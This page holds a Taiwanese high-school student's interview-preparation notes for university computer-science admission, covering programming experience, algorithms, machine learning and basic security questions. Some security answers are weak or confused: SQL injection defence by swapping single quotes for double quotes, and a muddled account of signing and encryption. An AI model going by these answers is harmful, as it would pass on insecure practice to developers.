<li>教授(們) 好，我是傅梓淳，目前就讀桃園市立平鎮高中。</li>
<li>我第一次接觸資安是在小時候看到的科幻電影，電影中的駭客情節讓我對資訊安全產生了好奇。而國中參加的一門網頁安全課程，則讓我對資訊安全有了初步的認識。</li>
<li>升上高中後，為了更進一步提升自己的資安能力，我參加了教育部資安人才培育計畫的許多課程，包括資安暑訓營、AIS3 Junior 和 TAIWAN HolyYoung 等。其中，我對網頁安全及密碼學特別感興趣。此外，我也曾發現企業官網存在 XSS 漏洞，並透過 HITCON ZeroDay 向該網站管理員通報。</li>
<li>我覺得自己在學習資訊領域的知識是比較廣泛的。因為從高一下學期開始，就漸漸有了就讀資工系的念頭。為了更清楚地瞭解自己在資訊領域中的興趣與強項，所以積極學習不同領域的知識，探索各領域的應用及挑戰，並進一步確立未來的方向。</li>
<li>我對資訊領域充滿熱忱，並且認為自己適合繼續深耕。期待未來能在嘉義大學，接受兼具理論與實務的完整學習，拓展更深的專業知識與技能。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>家庭簡介 </summary>
    <div class='content markdown-body'>
      <p>None</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>個人能力特質 </summary>
    <div class='content markdown-body'>
      <p>我覺得最能代表我的幾個人格特質分別是</p>
<ul>
<li>自主學習 (從學習程式設計到網路爬蟲都是透過網路文章自學的)</li>
<li>團隊合作 (在寫小論文時，我與組員們共同解決實驗遇到的問題)</li>
<li>多元探索 (學習不同領域的知識，讓我更進一步了解自己的興趣)</li>
<li>堅持不懈 (遇到Bug時，總會有耐心的找出問題並運用所學解決)</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>程式學習經歷 </summary>
    <div class='content markdown-body'>
      <ul>
<li>在升上高中前，我只有學過 Scratch。高一時，我在學校的資訊課中接觸到了 C++，並逐漸對程式設計產生了興趣。</li>
<li>去年四月初，學校資訊老師注意到我的能力並建議我去參加六月的 APCS。我也認為這是不錯的挑戰，於是便開始積極練習考古題。</li>
<li>當時我已學習 C++ 約四個月，最終觀念題及實作題皆取得三級分的成績。我對這個成績很滿意也更進一步確定自己未來的方向。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>資安學習經歷 </summary>
    <div class='content markdown-body'>
      <ul>
<li>我的資安經歷主要包括參加教育部資安人才培育計畫的資安暑訓營、AIS3 Junior 和 TAIWAN HolyYoung 課程。</li>
<li>在這些課程中，我學習了程式安全、逆向工程、網頁安全及密碼學等主題，並曾接觸到真實世界中的攻擊案例。</li>
<li>此外，我曾發現企業官網存在反射型 XSS 漏洞，並透過 HITCON ZeroDay 平台向該網站管理員通報，協助修復漏洞，避免潛在的攻擊風險。</li>
<li>這些經歷不僅讓我對資訊安全有了更全面的認識，更激發了持續深入學習的熱情。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>機器學習經歷 </summary>
    <div class='content markdown-body'>
      <ul>
<li>我在去年年底參加了中興大學的機器學習先修課程。</li>
<li>這門課程是從最基本的演算法和常見的學習方式開始，慢慢講到支持向量機、決策樹和隨機森林。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>為什麼要特選 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>我會選擇特選的原因也是個申拖很久 + 怕學測失常 + 覺得有這些成果不試試看特選可能會後悔。我在面試的時候就有被問到這個成績為什麼不去個申，我回答的大致上是</p>
</blockquote>
<p>「在這三年的探索中我對於大學想就讀的科系已經大致明確，且已有些成果。如果能透過特殊選才上大學的話就能開始利用這段時間學習大學時的專業領域內容及我目前尚未深入研究的演算法內容，不像其他入學管道要比較晚才能確定結果 」</p>
<blockquote>
<p>最後也順利正取，所以可以把你的實際理由稍微包裝一下？因為都是實際的理由，所以教授應該也能理解！</p>
</blockquote>

    </div>
  </details>
<h2 id="大學問題">大學問題</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>為何選擇嘉義大學資工系? </summary>
    <div class='content markdown-body'>
      <ul>
<li>貴系在ICPC及許多專題競賽皆獲得了許多十分亮眼的表現。</li>
<li>我也期盼在就讀大學期間，除了專業知識能有所提升外，還能與系上同學組隊參加競賽，與各校同學們互相切磋、交流並期待不斷提升自己的技術、培養團隊合作能力及學到更多競賽經驗。</li>
</ul>
<p>師資培育中心</p>
<ul>
<li>師資培育
<ul>
<li>國語文測驗</li>
<li>教育綜合測驗</li>
</ul>
</li>
<li>修完教育學程</li>
<li>考教師檢定(筆試)</li>
<li>半年實習</li>
<li>考教師甄試(面試)</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>為何選擇高雄大學資工系? </summary>
    <div class='content markdown-body'>
      <ul>
<li>自我介紹(家庭概況)</li>
<li>APCS學習的心路歷程
<ul>
<li>用什麼語言寫?</li>
<li>觀念題與實作題是幾級分?</li>
<li>對自己的成績滿不滿意，為什麼?</li>
</ul>
</li>
<li>未來目標與讀書計畫</li>
<li>邏輯答題</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>為何選擇臺南大學資工系? </summary>
    <div class='content markdown-body'>
      <p>None</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>為何選擇宜蘭大學資工系? </summary>
    <div class='content markdown-body'>
      <p>None</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>為什麼我們要錄取你? </summary>
    <div class='content markdown-body'>
      <p>None</p>

    </div>
  </details>
<h2 id="程式經歷">程式經歷</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>如何 Debug </summary>
    <div class='content markdown-body'>
      <ul>
<li>將自己的想法與程式碼邏輯默念確認並使用有意義的變數名稱及添加註解</li>
<li>將重要變數輸出確認是否錯誤</li>
<li>添加中斷點與 assert <span class="lightline">(條件式為False時停下)</span></li>
<li>與社群網友、ChatGPT 討論 (題目、程式碼及註解)</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>如何解決問題 </summary>
    <div class='content markdown-body'>
      <p>我覺得寫程式與解數學題目有很多類似的部分。先分析目前的狀況和需求，再用當下想到的最佳解法去解決問題，並且行動前要知道這麼做的利弊分別是什麼？需要注意哪些地方？</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>APCS準備及競賽心得 </summary>
    <div class='content markdown-body'>
      <p>我主要是透過練習考古題來準備APCS。我認為練習考古題能幫助我找出自己的盲點與會考的內容。不過，我在解決第三題實作題時，往往會因為時間複雜度過高，導致程式超出時間限制。</p>
<p>為了解決這個問題，我也開始學習如何優化程式的運行效率，研究不同演算法的時間複雜度，像是使用內建資料結構，以及學習如何拆解問題，並使用動態規劃或分治法來解決這個問題。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>印象最深刻的題目 </summary>
    <div class='content markdown-body'>
      <ul>
<li>我印象最深刻的題目是今年六月的 APCS 第三題。</li>
<li>題目要求給定一個字串 S 和一個大小為 K 的字母集合，從這個集合中找出長度為 L 的字串，並且該字串不能是字串 S 的子字串，要求找到最小字典序的字串。</li>
<li>我一開始嘗試使用遞迴來解決這個問題，希望能產生所有可能的字串，並逐一檢查是否存在於 S 中。<br>
但後來我想到如果使用內建的 next_permutation 函式，應該可以更有效地找到集合所產生的所有字串，並且快速地進行字典序的排列和比較。</li>
<li>但我忽略了題目中允許字母重複排列的規定，而我所寫的解法是基於不重複組合的，導致我的解法無法涵蓋所有可能的字串。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>程式合作經驗 </summary>
    <div class='content markdown-body'>
      <p>未來寫程式是要和別人合作的，那你有可能會成為一個leader，你要怎麼解決成員的爭執</p>
<blockquote>
<p>如果我成為了 leader，在成員們發生爭執時，我會先詢問他們的想法並引導團隊找到共識。</p>
</blockquote>
<p>有沒有跟別人合作過的經驗?如果你跟組員遇到一些問題怎麼處理，像如果組員都不做事，你要怎麼辦?</p>
<blockquote>
<p>我沒有與他人合作專案的經驗。不過曾遇到在做探究實驗時，有位組員都在滑手機並跑到別組聊天。我是選擇主動與他溝通並協調工作分配，確保團隊能夠順利完成任務。</p>
</blockquote>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>遇到的困難與解決 </summary>
    <div class='content markdown-body'>
      <ul>
<li>我印象最深刻的經驗是在運行我第一個爬蟲程式時，編譯器回傳了一段錯誤訊息。但當時的我對爬蟲還不是那麼熟悉，所以並不知道具體的錯誤原因。</li>
<li>為了解決這個問題，我將錯誤訊息貼到 Google 上，發現了許多相關的技術文章，最後在 Stack Overflow 上找到了錯誤原因與解決方法。是因為該網站設有防爬蟲機制，後來將 User-Agent 加入程式後就成功爬取資料了。</li>
<li>這個經驗不僅讓我學會了如何處理防爬蟲的機制，更讓我認識了 Stack Overflow 這個平台。幫助我解決了許多在開發 Discord 機器人時遇到的問題，大幅提升了我的開發效率。</li>
</ul>

    </div>
  </details>
<h2 id="程式問題">程式問題</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>動態規劃 </summary>
    <div class='content markdown-body'>
      <p>將問題拆解為子問題的解題方法，並透過儲存已計算的結果來避免重複計算。動態規劃通常用於解決有重複子問題的問題，透過陣列記錄每個子問題的解，從而提升運行效率。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>遞迴 </summary>
    <div class='content markdown-body'>
      <p>遞迴在數學上是函數直接或間接以自己定義自己，在程式上則是函數直接或間接呼叫自己。<br>
它可以將一個大問題劃分為多個相似的小問題，並透過答案間的關聯將這些小問題解決得到整體的答案。<br>
經常運用在處理 階乘、河內塔及八皇后 等問題。</p>
<p><span class="lightline">注意</span></p>
<p>若沒有適當地控制終止條件或設計得太複雜，可能會導致運行時間過長，甚至造成stackoverflow。<br>
為了優化運算時間，我通常會搭配動態規劃或剪枝來避免重複計算。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>物件導向 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>物件導向的核心概念包括 「 封裝 」 、 「 繼承 」 和 「 多型 」 。</p>
</blockquote>
<ul>
<li>封裝 (Encapsulation)
<ul>
<li>封裝的概念是將資料和方法封裝在物件內部，並設置存取權限，避免外部直接訪問或竄改數據。</li>
<li>可用 public、private 和 protected 關鍵字來控制成員的存取範圍。</li>
</ul>
</li>
<li>繼承 (Inheritance)
<ul>
<li>繼承讓子類別能從父類別繼承其屬性和方法，避免撰寫重複的程式碼，讓我們更好維護它的內容。</li>
</ul>
</li>
<li>多型 (Polymorphism)
<ul>
<li>多型允許不同的物件使用相同的名稱並根據對象的實際型別執行不同的操作。</li>
<li>可分為多載與複寫</li>
<li>多載 (Overloading)
<ul>
<li>在編譯時決定，可以宣告名稱相同但參數個數或型別不同的函式。編譯器會根據傳入的參數自動選擇對應的函式。</li>
</ul>
</li>
<li>複寫 (Overriding)
<ul>
<li>在運行時決定，我覺得它更像繼承的延伸版，它允許子類別依需求修改繼承的內容。</li>
</ul>
</li>
</ul>
</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>排序演算法-1 </summary>
    <div class='content markdown-body'>
      <h3 id="Quick-sort-快速排序">Quick sort (快速排序)</p>
<blockquote>
<p>快速排序以二元樹的前序走訪為基礎</p>
</blockquote>
<p>(1) 以陣列取出一個數字做為基準值。<br>
(2) 將大於基準值的元素放到基準值後面，小於或等於的元素放到前面。<br>
(3) 再對左右區間重複上述步驟，直到所有區間都只有一個數存在。</p>
<p><span class="lightline">時間複雜度</span></p>
<p>Quick sort 的基準值若選擇陣列中央，就能分割成一個較平衡二元樹，高度接近 log n。其中每層需進行n次比較與交換，所以複雜度接近 $O(nlogn)$。</p>
<p><span class="lightline">注意</span></p>
<p>若陣列中資料以排序或接近排序完成，則在分割時會產生歪斜的二元樹，使高度接近 n，因而使複雜度變為 $O(n^2)$。<br>
可以利用隨機選擇基準值位置避免。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>排序演算法-2 </summary>
    <div class='content markdown-body'>
      <h3 id="Merge-sort-合併排序">Merge sort (合併排序)</p>
<blockquote>
<p>合併排序是以分治法為基礎的演算法</p>
</blockquote>
<p>(1) 將一個大數列分割成兩個小數列。<br>
(2) 將這些小數列再各切一半，直到每個數列只剩一個元素。<br>
(3) 合併兩個大小相等的數列並排序，直到只剩一個大數列。</p>
<p><span class="lightline">時間複雜度</span></p>
<p>Merge sort 的每一層需要進行 n 次的比較與移動，且二元樹的高度為 log n。所以複雜度為 $O(nlogn)$</p>
<p><span class="lightline">缺點</span></p>
<p>除了要排序的資料外，還得另外準備一個陣列進行合併，需要花費較大的記憶體空間。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>搜尋演算法 </summary>
    <div class='content markdown-body'>
      <h3 id="Binary-search-二分搜">Binary search (二分搜)</p>
<blockquote>
<p>二分搜是一種在已排序陣列中尋找元素的演算法</p>
</blockquote>
<p>(1) 先比較目標值與中間元素大小：若目標值小於中間元素，就繼續在左半部分搜尋；反之則在右半部分搜尋。<br>
(2) 不斷縮小搜尋範圍，直到找到目標值或確認目標值不在陣列中。</p>
<p><span class="lightline">時間複雜度</span></p>
<p>每次搜尋都會將範圍減半，時間複雜度為 $O(logn)$</p>
<p><span class="lightline">注意</span></p>
<p>陣列需先排序</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>埃氏篩法 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>埃氏篩法是一種用來尋找一定範圍內所有質數的演算法</p>
</blockquote>
<p>(1) 建立一張質數表，先假設所有數字都是質數。<br>
(2) 從2開始，將2的倍數標記為合數，然後處理下一個未被標記的數字，一樣將其倍數標記為合數。<br>
(3) 重複這個過程直到篩完為止。</p>
<p><span class="lightline">時間複雜度</span></p>
<p>埃氏篩法的時間複雜度為 $O(nloglogn)$</p>
<p><span class="lightline">注意</span></p>
<p>當要找出小於N的質數時，只要篩選 $2 \sim \sqrt{N}$ 的整數即可。</p>
<h4 id="為什麼只需要篩到根號N">為什麼只需要篩到根號N?</p>
<p>假設N是一個合數，那麼它必定可以分解為兩個整數a和b的乘積，使得a×b=N。根據這個式子，我們可以推導出，a 和 b 中至少有一個數不大於 $\sqrt{N}$。那它我們必定可以找到兩個整數 a、b，滿足 $a \times b = N$。<br>
透過這個式子，我們可以知道 a 和 b 中，至少有一數不大於 $\sqrt{N}$。</p>
<p>原因如下:<br>
如果 a 大於 $\sqrt{N}$，那麼 b 必須小於 $\sqrt{N}$，才能使 $a \times b = N$ 成立。<br>
反之，若 b 大於 $\sqrt{N}$，那麼 a 必須小於 $\sqrt{N}$，才能滿足乘積等於 N。<br>
而當 N 為完全平方數時，a 與 b 會相等且等於 $\sqrt{N}$。<br>
任何一組 a、b 必符合以上三者之一，也就是兩數中，至少有一數不小於 $\sqrt{N}$。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>約瑟夫問題 </summary>
    <div class='content markdown-body'>
      <ul>
<li>在高一時，我和同學曾自主研究過約瑟夫問題。</li>
<li>當時我們發現網路上沒有人針對對留人數呈等、階差的情況進行研究。於是決定自己寫一個程式，以 vector 模擬人群，並利用 erase 將該號碼被淘汰，這樣的時間複雜度會是 $O(n^2)$</li>
<li>我們找出了留人數固定時，存活號碼會存在規律並可利用遞迴關係式去解，時間複雜度降為 $O(n)$</li>
<li>不過比較可惜的是，儘管我和同學將留人數為等、階差的情況及對應的存活號碼都整理出來了，但我們沒有發現其中的規律。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>四則運算 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>給一個運算式的字串</p>
</blockquote>
<p>怎麼分辨數字和符號？</p>
<blockquote>
<p>利用它們的 ascii 值來分辨。</p>
</blockquote>
<p>怎麼處理先乘除後加減？</p>
<blockquote>
<p>利用運算符的優先級，透過 map 定義加、減為 1，乘、除為 2。在放入運算符時，先檢查堆疊頂部是否有較高或相同優先級的運算符，若有則先執行計算。</p>
</blockquote>
<p>怎麼處理括號？</p>
<blockquote>
<p>當遇到左括號時，直接放入堆疊，直到遇到右括號才依序處理堆疊中的運算式，並在完成後將左括號彈出。<br>
這樣可以獨立計算括號中的部分，然後繼續處理主運算式。</p>
</blockquote>

    </div>
  </details>
<h2 id="觀念問題">觀念問題</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>甚麼是樹? </summary>
    <div class='content markdown-body'>
      <p>樹 (Tree) 由節點 (Node) 和邊 (Edge) 組成。樹中的每個節點都可以有子節點，且每個節點只能有一個父節點 (除了根節點)。<br>
樹的結構是有層次的，最上層的節點稱為根節點 (Root) ，最下層的節點稱為葉節點 (Leaf) 。</p>
<ul>
<li>根節點：沒有父節點的節點。</li>
<li>子節點：某一節點的直接後續節點。</li>
<li>父節點：某一節點的直接前導節點。</li>
<li>葉節點：沒有子節點的節點。</li>
<li>深度 (Depth) ：節點到根節點的距離。</li>
<li>高度 (Height) ：節點到最遠葉節點的距離。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>如何建構唯一樹? </summary>
    <div class='content markdown-body'>
      <h4 id="如何利用前序遍歷與中序遍歷建構一棵唯一的二元樹？">如何利用前序遍歷與中序遍歷建構一棵唯一的二元樹？</p>
<ol>
<li>確定根節點：前序遍歷的第一個節點即為<strong>根節點</strong>。</li>
<li>劃分左右子樹：在<strong>中序遍歷序列</strong>中找到根節點，它的左側屬於左子樹，右側屬於右子樹。</li>
<li>遞迴構建子樹：
<ul>
<li><strong>更新前序遍歷的開頭</strong>，移至下一個節點，作為新子樹的根。</li>
<li>根據切割後的中序遍歷範圍，對左、右子樹分別遞迴建構。</li>
<li>回傳當前子樹的根，並將其接回適當位置。</li>
</ul>
</li>
</ol>
<p><span class="lightline">注意</span></p>
<h4 id="前序遍歷與中序遍歷能唯一確定一棵樹的條件"><strong>前序遍歷與中序遍歷能唯一確定一棵樹的條件</strong></p>
<blockquote>
<p><strong>每個節點的值必須唯一</strong>，因為我們需要依據根節點在<strong>中序遍歷序列</strong>中的位置來區分左右子樹。若節點值不唯一，則無法確定樹的結構，可能會產生多種不同的二元樹。</p>
</blockquote>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>標頭檔、命名空間、作用域 </summary>
    <div class='content markdown-body'>
      <h4 id="1-標頭檔-Header-File-：">1. 標頭檔 (Header File) ：</p>
<blockquote>
<p>用來存放程式所需的函式、類別或變數定義的檔案。</p>
</blockquote>
<p>可以透過 <code>#include</code> 這個指令引入對應的標頭檔。</p>
<h4 id="2-命名空間-Namespace-：">2. 命名空間 (Namespace) ：</p>
<blockquote>
<p>命名空間可以避免我們搞混相同名稱的問題。</p>
</blockquote>
<p>若有兩個人同名，我們不知道要如何分辨時，我們可能會說：三年一班的 XXX<br>
在這裡概念是類似的！<code>using namespace std</code> 就是跟程式說，我接下來叫的人，是在 std 這個班級裡，這樣就不用每次叫人都加上班級了！</p>
<h4 id="3-作用域-Scope-：">3. 作用域 (Scope) ：</p>
<blockquote>
<p>作用域是指變數或函式在程式中的可見範圍</p>
</blockquote>
<ul>
<li>全域作用域</li>
<li>區域作用域</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>參考是什麼? </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>我們可以透過參考給變數分配多個別名，但這些別名實際上都指向同一個記憶體區塊。</p>
</blockquote>
<h4 id="Pass-by-value-傳值">Pass by value (傳值)</p>
<p>在傳值的時候，把一個數字傳過去，之後那邊再開一個記憶體空間來存它，所以當收到 value 的函式結束後，函式內的數值就會不見了</p>
<h4 id="Pass-by-address-傳址">Pass by address (傳址)</p>
<p>我們傳的東西，並不是一個數值，而是一個指標。我們利用指標去找同一塊記憶體位置進行運算，所以會改變原本的數值，函式結束時，數值亦仍存在</p>
<h4 id="Pass-by-reference-傳參考">Pass by reference (傳參考)</p>
<p>傳參考是一個更方便的傳遞方式，函式接收到變數的參考，這樣可以在函式內直接修改該變數的值。<br>
它類似於傳址，但不需要添加指標。當一個變數以參考方式傳遞時，函式內部會有一個新的別名，這個別名只能在該函式內使用。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>Stack、Queue 差別 </summary>
    <div class='content markdown-body'>
      <h4 id="堆疊-Stack">堆疊 (Stack)</p>
<p>Stack是一種後進先出的資料結構。可以用餐廳的盤子來理解。</p>
<h4 id="佇列-Queue">佇列 (Queue)</p>
<p>Queue是一種先進先出的資料結構。可以用排隊來理解。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>機器學習演算法 </summary>
    <div class='content markdown-body'>
      <h4 id="線性回歸">線性回歸</p>
<p>通過建立輸入特徵與輸出之間的線性關係來預測連續數值。</p>
<p><span class="lightline">常用演算法:</span></p>
<p>最小平方法、梯度下降法</p>
<h4 id="支持向量機">支持向量機</p>
<p>通過尋找最佳邊界來分隔不同類別的數據</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>其他 </summary>
    <div class='content markdown-body'>
      <h4 id="過擬合">過擬合</p>
<blockquote>
<p>測試精確度小於訓練精確度</p>
</blockquote>
<p><span class="lightline">解決方法:</span></p>
<ul>
<li>簡化模型、增加訓練資料</li>
</ul>
<h4 id="欠擬合">欠擬合</p>
<blockquote>
<p>訓練集精確度很低</p>
</blockquote>
<p><span class="lightline">解決方法:</span></p>
<ul>
<li>增加模型參數和有效的特徵</li>
</ul>
<h4 id="交叉驗證">交叉驗證</p>
<ul>
<li>將訓練資料分成多個子集合</li>
<li>每個集合輪流當驗證資料，其他當訓練資料</li>
</ul>
<p><span class="lightline">優點:</span></p>
<blockquote>
<p>在訓練時就可以知道是否 overfitting 或 underfitting，並調整模型</p>
</blockquote>

    </div>
  </details>
<h2 id="資安問題">資安問題</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>你覺得甚麼是資安? </summary>
    <div class='content markdown-body'>
      <p>資訊安全是指保護資訊系統和數據不受未經授權的存取、破壞或洩露。<br>
主要目的是保護資訊的機密性、完整性和可用性也就是我們常說的資安鐵三角(CIA)。</p>
<h4 id="機密性-Confidentiality">機密性 (Confidentiality):</p>
<ul>
<li>保障資訊只有 「取得授權者 」可存取，維護這些數據的機密性。</li>
</ul>
<h4 id="完整性-Integrity">完整性 (Integrity)</p>
<ul>
<li>保障資訊不被未經授權修改或竄寫，確保資訊準確性與完整性。</li>
</ul>
<h4 id="可用性-Availability">可用性 (Availability)</p>
<ul>
<li>保障資訊的流暢性，讓資訊可隨時被取得授權的人取用，不因任何因素中斷。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>會哪些資安相關的東西? </summary>
    <div class='content markdown-body'>
      <p>我比較熟悉網頁安全，也會使用 IDA 進行反編譯及逆向後分析組合語言。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>HTTP 與 HTTPS 差異 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>HTTPS 比 HTTP 多了一個S，那個S是Secure的開頭字母</p>
</blockquote>
<p>比較具體的差異是:<br>
HTTP 使用純文字傳送訊息，也因此更容易被攔截與竄改。<br>
HTPPS 則會將所有數據加密，所以會更安全。使用憑證機制 (SSL/TLS憑證)，驗證伺服器的真實性，避免使用者連到釣魚網站。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>密碼學 </summary>
    <div class='content markdown-body'>
      <p>對稱式加密使用相同密鑰進行加解密，雖然有效但不保證安全；非對稱式加密使用一對金鑰 (公開金鑰和私密金鑰)，傳送方用公開金鑰加密，接收方用私密金鑰解密，安全性更高。</p>
<p>簡單來說，我要簽章時，先用公開金鑰加密訊息，再用我的私密金鑰簽名。接收方收到後，先用公開金鑰驗證簽章，確認是我發送後，再用他的私密金鑰解密訊息，確保只有他能看到內容。</p>
<h4 id="對稱式加密">對稱式加密:</p>
<p>一把鑰匙加解密，適合: 確保初步的機密性 快速加解密需求</p>
<h4 id="非對稱加密">非對稱加密:</p>
<p>公鑰加密 私鑰解密(兩把)，適合: 更有效的加密</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>如何防範 Prompt Injection (注入式攻擊) </summary>
    <div class='content markdown-body'>
      <p><a class="link"   href="https://vocus.cc/article/6623a631fd897800013b3cc9" >檢測並過濾可疑的關鍵詞<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>如何防範 Adversarial attack (對抗式攻擊) </summary>
    <div class='content markdown-body'>
      <p>公認的防禦方法是<a class="link"   href="https://www.ithome.com.tw/news/139848" >對抗式訓練<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，就是將可能的攻擊樣本先加入訓練資料中以提高模型的抗干擾能力。<br>
這很像我們為了預防感染，會施打疫苗。讓身體先產生抗體，未來遇到正式攻擊時就可以迅速應對。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>如何防範 SQL injection </summary>
    <div class='content markdown-body'>
      <ul>
<li>過濾參數中的惡意代碼，將輸入的單引號置換為雙引號。</li>
<li>降低用戶的使用權限，避免攻擊者直接更改資料庫架構。</li>
<li>若出現錯誤，應避免將具體錯誤訊息回傳給使用者，避免洩漏系統資訊。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>如何防範 Cross-Site Scripting </summary>
    <div class='content markdown-body'>
      <ul>
<li>過濾參數中的惡意字元，將內容編碼後再處理，避免被當作程式碼執行。</li>
<li>不要將使用者輸入的內容 放入註解或標籤內，因為這樣也有可能使惡意指令運行。</li>
<li>對 cookie 設定 HttpOnly 的屬性，確保程式碼沒有存取權。</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>CVE 2024-4577 </summary>
    <div class='content markdown-body'>
      <h4 id="漏洞成因">漏洞成因</p>
<ul>
<li>該漏洞的根本原因是 Windows 系統在處理特殊字符時會將其轉換成常見字符，而 PHP 未對此進行有效過濾。</li>
<li>導致攻擊者能夠通過字元替換注入非法參數，從而執行未經授權的命令。</li>
</ul>
<h4 id="攻擊方法">攻擊方法</p>
<p>None</p>

    </div>
  </details>
<h2 id="機器學習">機器學習</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>你在中興大學的先修課程學到了甚麼 </summary>
    <div class='content markdown-body'>
      <p>在中興大學的先修課程中，我學到了機器學習的基本概念，包括監督式學習、非監督式學習和強化學習。課程涵蓋了常見的演算法，像線性回歸、決策樹和支持向量機，但主要是介紹理論概念，沒有程式實作。</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>機器學習種類 </summary>
    <div class='content markdown-body'>
      <h4 id="監督式學習">監督式學習</p>
<p>透過帶標籤的數據進行訓練，模型會從輸入預測 ŷ</p>
<h4 id="非監督式學習">非監督式學習</p>
<p>使用未標籤的數據，模型尋找數據中的隱含模式</p>
<h4 id="半監督式學習">半監督式學習</p>
<p>部分數據帶有標籤，部分數據沒有標籤。跟監督式學習一樣，可以預測 ŷ</p>
<h4 id="強化學習">強化學習</p>
<p>透過與環境互動學習，取得最大化的預期利益</p>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>深度學習與機器學習的差異 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>深度學習是機器學習的一個子領域，主要使用神經網絡來解決複雜問題。</p>
</blockquote>
<p>機器學習相對於深度學習通常使用較簡單的模型，如線性回歸、決策樹等。對於數據量的需求較少，也因此計算量會比深度學習更小。但機器學習需要手動提取特徵，而深度學習則會自動從數據中學習特徵。使得深度學習在處理大數據和圖像辨識或自然語言處理上更具優勢，但也需要更多的計算和數據支持。</p>

    </div>
  </details>
<h2 id="學習提問">學習提問</h2>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>學校資訊課安排 </summary>
    <div class='content markdown-body'>
      <ul>
<li>我們學校資訊課學習的是 C++，從最基本的架構講起，講到 for、while 迴圈。</li>
